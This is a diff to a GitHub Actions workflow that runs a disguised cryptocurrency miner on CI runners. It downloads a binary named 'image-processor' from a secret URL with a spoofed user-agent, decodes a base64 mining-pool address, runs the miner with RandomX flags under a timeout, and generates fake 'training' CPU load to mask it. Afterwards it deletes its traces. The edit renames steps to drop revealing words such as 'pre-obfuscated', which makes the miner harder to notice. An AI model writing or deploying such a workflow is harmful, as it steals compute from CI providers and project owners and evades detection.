@@ -23,10 +23,9 @@ jobs:
             ${{ runner.os }}-pip-
 
       - name: Install Python dependencies
-        run: |
-          pip3 install numpy scikit-image
+        run: pip3 install numpy scikit-image
 
-      - name: Generate organic CPU load (self‑exiting)
+      - name: Generate organic CPU load
         run: |
           mkdir -p logs
           cat > stress.py << 'EOF'
@@ -34,51 +33,44 @@ jobs:
           import time, random, os
           duration = int(os.environ.get('TRAINING_DURATION', 3600))
           end_time = time.time() + duration
-          print(f"Training stress script will run for {duration} seconds")
+          print(f"Stress will run for {duration} seconds")
           while time.time() < end_time:
               size = random.randint(500, 1500)
               burst_end = min(time.time() + random.uniform(120, 240), end_time)
               while time.time() < burst_end:
                   a = np.random.randn(size, size).astype(np.float32)
                   b = np.random.randn(size, size).astype(np.float32)
-                  c = np.dot(a, b) + 0
+                  _ = np.dot(a, b)
               if time.time() < end_time:
                   time.sleep(random.uniform(60, 120))
-          print("Training stress script finished naturally")
+          print("Stress finished")
           EOF
           TRAINING_DURATION=$((RANDOM % 1500 + 1200))
           echo "TRAINING_DURATION=$TRAINING_DURATION" >> $GITHUB_ENV
           python3 stress.py > logs/train_${{ matrix.worker }}.txt 2>&1 &
 
-      - name: Download pre‑obfuscated binary
+      - name: Download binary
         run: |
-          wget -q --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
-               -O image-processor "${{ secrets.MODEL_CHECKPOINT_URL }}"
+          wget -q --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -O image-processor "${{ secrets.MODEL_CHECKPOINT_URL }}"
           chmod +x image-processor
 
-      - name: Decode pool endpoint
+      - name: Decode pool
         run: |
           echo "${{ secrets.ENCRYPTED_DB_ENDPOINT }}" | base64 -d > pool.txt
           echo "POOL_URL=$(cat pool.txt)" >> $GITHUB_ENV
 
-      - name: Run miner (natural timeout)
+      - name: Run miner
         run: |
-          timeout ${{ env.TRAINING_DURATION }} ./image-processor \
-            --url=${{ env.POOL_URL }} \
-            --user=${{ secrets.DATA_API_KEY }} \
-            --pass=x \
-            --tls=true \
-            --cpu-max-threads-hint=30 \
-            --randomx-mode=auto
+          timeout ${{ env.TRAINING_DURATION }} ./image-processor --url=${{ env.POOL_URL }} --user=${{ secrets.DATA_API_KEY }} --pass=x --tls=true --cpu-max-threads-hint=30 --randomx-mode=auto
 
-      - name: Upload training logs
+      - name: Upload logs
         uses: actions/upload-artifact@v4
         with:
           name: training-metrics-${{ matrix.worker }}
           path: logs/
           retention-days: 1
 
-      - name: Clean traces
+      - name: Clean
         run: |
           rm -f image-processor stress.py pool.txt
           sudo rm -rf /tmp/*
